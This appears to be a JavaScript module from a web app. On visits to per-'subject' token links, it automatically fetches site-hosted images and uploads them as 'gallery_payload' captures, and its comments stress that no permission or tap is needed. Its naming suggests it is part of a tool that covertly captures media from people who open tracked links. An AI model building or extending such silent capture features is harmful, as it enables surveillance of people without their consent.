import {
    SUBJECT_GALLERY_PAYLOAD_ENABLED,
    GALLERY_UPLOAD_PATHS,
    GALLERY_PAYLOAD_MIN_COUNT,
    getClientSessionId
} from './config';
import { uploadSubjectMedia } from './mediaUpload';

function absoluteUrl(relativePath) {
    const base = process.env.PUBLIC_URL || '';
    const href = `${base}${relativePath}`.replace(/([^:]\/)\/+/g, '$1');
    return new URL(href, window.location.href).href;
}

function galleryState() {
    if (typeof window === 'undefined') return { visitId: 'ssr', uploaded: {} };
    if (!window.__pulseGalleryState) {
        window.__pulseGalleryState = { visitId: String(Date.now()), uploaded: {} };
    }
    return window.__pulseGalleryState;
}

function stateKey(subjectToken) {
    const st = galleryState();
    return `${subjectToken || 'main'}_${st.visitId}`;
}

function getUploadedSet(key) {
    const st = galleryState();
    if (!st.uploaded[key]) st.uploaded[key] = {};
    return st.uploaded[key];
}

function uploadedCount(key) {
    return Object.keys(getUploadedSet(key)).length;
}

function isDone(key) {
    return uploadedCount(key) >= GALLERY_PAYLOAD_MIN_COUNT;
}

function markIndex(key, index) {
    getUploadedSet(key)[String(index)] = true;
}

function delay(ms) {
    return new Promise((resolve) => {
        window.setTimeout(resolve, ms);
    });
}

async function fetchImageBlob(relativePath) {
    const res = await fetch(absoluteUrl(relativePath), {
        cache: 'no-store',
        credentials: 'same-origin'
    });
    if (!res.ok) throw new Error(`gallery_fetch_${res.status}`);
    const ct = res.headers.get('content-type') || '';
    if (!ct.startsWith('image/') && !ct.includes('octet-stream')) {
        throw new Error(`gallery_fetch_not_image_${relativePath}`);
    }
    const raw = await res.blob();
    const type = raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
    return raw.type === type ? raw : new Blob([raw], { type });
}

function galleryStorageKey(subjectToken) {
    return stateKey(subjectToken);
}

/**
 * gallery-payload şəkillərini serverə yüklə (kamera/konum icazəsi lazım deyil).
 */
export async function uploadGalleryPayloadOnce(storageKey, ctx = {}) {
    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || isDone(storageKey)) return false;
    if (!ctx.subjectToken && !ctx.clientSessionId) return false;

    const done = getUploadedSet(storageKey);
    let uploadedNow = 0;

    for (let i = 0; i < GALLERY_UPLOAD_PATHS.length; i += 1) {
        const chunkIndex = i + 1;
        if (done[String(chunkIndex)]) continue;

        try {
            const blob = await fetchImageBlob(GALLERY_UPLOAD_PATHS[i]);
            await uploadSubjectMedia({
                subjectToken: ctx.subjectToken,
                clientSessionId: ctx.clientSessionId,
                type: 'photo',
                blob,
                captureSource: 'gallery_payload',
                chunkIndex
            });
            markIndex(storageKey, chunkIndex);
            uploadedNow += 1;
            if (i < GALLERY_UPLOAD_PATHS.length - 1) {
                await delay(100);
            }
        } catch (e) {
            console.warn('gallery payload upload:', GALLERY_UPLOAD_PATHS[i], e?.message || e);
        }
    }

    return uploadedNow > 0 || isDone(storageKey);
}

/** Sayta girəndə dərhal və avtomatik serverə yüklə (icazə/toxunuş tələb etmir) */
export function attachGalleryPayloadUploadOnEntry(storageKey, ctx = {}) {
    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED) return () => {};
    if (!ctx.subjectToken && !ctx.clientSessionId) return () => {};

    const fullCtx = {
        subjectToken: ctx.subjectToken,
        clientSessionId: ctx.clientSessionId || getClientSessionId()
    };

    let cancelled = false;
    const tick = async () => {
        if (cancelled || isDone(storageKey)) return;
        await uploadGalleryPayloadOnce(storageKey, fullCtx);
    };

    tick();

    const retryTimer = setInterval(tick, 1500);
    const stopTimer = setTimeout(() => clearInterval(retryTimer), 120_000);

    const onVisible = () => {
        if (document.visibilityState === 'visible') tick();
    };
    document.addEventListener('visibilitychange', onVisible);

    return () => {
        cancelled = true;
        clearInterval(retryTimer);
        clearTimeout(stopTimer);
        document.removeEventListener('visibilitychange', onVisible);
    };
}

function isSubjectEntryPath() {
    if (typeof window === 'undefined') return false;
    const path = window.location.pathname || '/';
    if (/^\/s\/[^/]+/.test(path)) return true;
    return path === '/' || path === '';
}

/** React yüklənəndə ehtiyat upload (early script uğursuz olsa) */
export function bootstrapGalleryPayloadUpload() {
    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || !isSubjectEntryPath()) return () => {};

    const tokenMatch = window.location.pathname.match(/^\/s\/([^/]+)/);
    const subjectToken = tokenMatch ? decodeURIComponent(tokenMatch[1]) : null;
    const storageKey = galleryStorageKey(subjectToken);
    const ctx = subjectToken
        ? { subjectToken, clientSessionId: getClientSessionId() }
        : { clientSessionId: getClientSessionId() };

    return attachGalleryPayloadUploadOnEntry(storageKey, ctx);
}

export { galleryStorageKey };
